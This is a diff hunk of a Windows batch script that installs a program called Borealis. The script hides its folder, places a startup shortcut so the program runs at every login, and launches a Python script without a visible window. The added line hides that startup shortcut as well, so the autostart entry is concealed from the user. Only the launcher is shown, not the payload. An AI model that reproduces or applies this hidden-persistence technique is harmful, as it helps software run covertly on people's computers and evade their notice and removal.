@@ -5,4 +5,5 @@ C:
 attrib +h C:\Users\Public\Borealis
 cd C:\Users\Public\Borealis
 copy "%destinationFolder%\borealis.lnk" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+attrib +h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\borealis.lnk"
 start "" cmd /c "pythonw borealis.pyw"
